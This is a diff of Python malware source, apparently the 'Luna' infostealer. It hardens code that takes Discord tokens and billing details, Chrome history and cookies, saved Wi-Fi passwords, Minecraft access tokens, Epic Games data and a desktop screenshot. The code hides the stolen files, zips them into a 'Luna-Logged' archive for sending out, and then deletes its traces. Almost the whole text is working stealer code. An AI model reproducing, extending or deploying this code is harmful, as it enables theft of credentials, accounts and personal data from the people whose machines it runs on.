@@ -270,15 +270,14 @@ class grabtokens():
             embed.add_field(name="DISCORD INFO", value=f'''```yaml
 Discord Username: {username} \nDiscord ID: {uid}\nEmail: {email}\n\nPhone: {phone}\nNitro: {nitro}\nBilling: {methods}\n\nToken: {token}```''', inline=False)
 
-@try_extract
 def ss():
     ImageGrab.grab(
         bbox=None,
         include_layered_windows=False,
         all_screens=True,
         xdisplay=None
-    ).save("screenshot.png")
-    hide("screenshot.png")
+    ).save("desktop-screenshot.png")
+    hide("desktop-screenshot.png")
 
 @try_extract
 class grabpassword():
@@ -369,37 +368,39 @@ class grabpassword():
 @try_extract
 class grabhistory():
     def __init__(self):
-        if "chrome.exe" in (p.name() for p in psutil.process_iter()):
-            os.system("taskkill /im chrome.exe /f")
-
         with open("google-history.txt", "w") as f:
             f.write("https://github.com/Smug246 | Google Chrome History\n\n")
         hide(".\\google-history.txt")
 
-        username = os.getlogin()
-        dir="C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\".format(username)
-        history_db = os.path.join(dir, 'history')
-        c = sqlite3.connect(history_db)
-        cursor = c.cursor()
-        select_statement = "SELECT id,url,title FROM urls"
-        cursor.execute(select_statement)
-        results = cursor.fetchall()
+        try:
+            username = os.getlogin()
+            dir="C:\\Users\\{}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\".format(username)
+            history_db = os.path.join(dir, 'history')
+            c = sqlite3.connect(history_db)
+            cursor = c.cursor()
+            select_statement = "SELECT id,url,title FROM urls"
+            cursor.execute(select_statement)
+            results = cursor.fetchall()
 
-        ids = []
-        urls = []
-        titles = []
-        history = []
+            ids = []
+            urls = []
+            titles = []
+            history = []
    
-        for res in results:
-            id,url,title = res
-            history.append(f"{id} | Url: {url} | {title}")
-            ids.append(id)
-            urls.append(urls)
-            titles.append(title)
+            for res in results:
+                id,url,title = res
+                history.append(f"{id} | Url: {url} | {title}")
+                ids.append(id)
+                urls.append(urls)
+                titles.append(title)
         
-        with open(".\\google-history.txt", "a") as f:
-            f.write("\nAll Google Search History:\n")
-            f.write("\n".join(history))
+            with open(".\\google-history.txt", "a") as f:
+                f.write("\nAll Google Search History:\n")
+                f.write("\n".join(history))
+        except Exception:
+            with open(".\\google-history.txt", "a") as f:
+                f.write("\nNo google history was found :(")
+
 
 @try_extract
 class grabwifi:
@@ -410,7 +411,7 @@ class grabwifi:
         with open(".\\wifi-passwords.txt", "w", encoding="cp437", errors='ignore') as f:
             f.write("https://github.com/Smug246 | Wifi Networks & Passwords\n\n")
         hide(".\\wifi-passwords.txt")
-  
+        
         data = subprocess.getoutput('netsh wlan show profiles').split('\n')
         for line in data:
             if 'All User Profile' in line:
@@ -442,15 +443,23 @@ class grabmctokens():
         self.roaming = os.getenv("appdata")
 
         with open((".\\minecraft-sessioninfo.json"), 'w', encoding="cp437", errors='ignore') as f:
-            launcher_profiles = json.loads(open(self.roaming + "\\.minecraft\\launcher_accounts.json").read())
             f.write("https://github.com/Smug246 | Minecraft Accounts & Access Tokens\n\n")
-            f.write(str(launcher_profiles))
+            try:
+                launcher_profiles = json.loads(open(self.roaming + "\\.minecraft\\launcher_accounts.json").read())
+                f.write(str(launcher_profiles))
+            except Exception:
+                f.write("No minecraft accounts or access tokens :(")
         hide(".\\minecraft-sessioninfo.json")
 
+
+
         with open((".\\minecraft-usercache.json"), 'w', encoding="cp437", errors='ignore') as g:
-            usercache = json.loads(open(self.roaming + "\\.minecraft\\usercache.json").read())
             g.write("https://github.com/Smug246 | Minecraft UUID & Display Name\n\n")
-            g.write(str(usercache))
+            try:
+                usercache = json.loads(open(self.roaming + "\\.minecraft\\usercache.json").read())
+                g.write(str(usercache))
+            except Exception:
+                g.write("No minecraft uuid or display name found :(")
         hide(".\\minecraft-usercache.json")
 
 @try_extract
@@ -458,19 +467,23 @@ class epicgamesdata():
     def __init__(self):
         self.appdata = os.getenv("localappdata")
 
-        epic_path = (self.appdata + "\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini")
-        with open(epic_path, "r") as f:
-            lines = f.readlines()
-        for line in lines:
-            if line.startswith("Data="):
-                eg_data = line.split('Data=')[1].strip()
+        try:
+            with open((".\\epicgames-data.txt"), 'w', encoding="cp437", errors='ignore') as g:
+                g.write("https://github.com/Smug246 | Epic Games Offline Data\n\n")
+                g.write("Epic Games Offline Data:\n")
 
-        with open((".\\epicgames-data.txt"), 'w', encoding="cp437", errors='ignore') as g:
-            g.write("https://github.com/Smug246 | Epic Games Offline Data\n\n")
-            g.write("Epic Games Offline Data:\n")
-            g.write(eg_data)
-        hide(".\\epicgames-data.txt")
-
+                epic_path = (self.appdata + "\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini")
+                with open(epic_path, "r") as f:
+                    lines = f.readlines()
+                for line in lines:
+                    if line.startswith("Data="):
+                        eg_data = line.split('Data=')[1].strip()
+                g.write(eg_data)
+        except Exception as e:
+            with open((".\\epicgames-data.txt"), 'w', encoding="cp437", errors='ignore') as g:
+                g.write("https://github.com/Smug246 | Epic Games Offline Data\n\n")
+                g.write(f"No epic games data was found :(\n{e}")
+            
 @try_extract
 class grabcookies():
     def __init__(self):
@@ -554,7 +567,7 @@ def zipup():
         zipf.write("minecraft-sessioninfo.json")
         zipf.write("minecraft-usercache.json")
         zipf.write("epicgames-data.txt")
-        zipf.write("screenshot.png")
+        zipf.write("desktop-screenshot.png")
     hide(f'Luna-Logged-{os.getenv("Username")}.zip')
 
 def cleanup():
@@ -565,7 +578,7 @@ def cleanup():
                   os.remove("minecraft-usercache.json"),
                   os.remove("minecraft-sessioninfo.json"),
                   os.remove("epicgames-data.txt"),
-                  os.remove("screenshot.png"),
+                  os.remove("desktop-screenshot.png"),
                   os.remove(f"Luna-Logged-{os.getenv('Username')}.zip")]:
         try:
             clean()
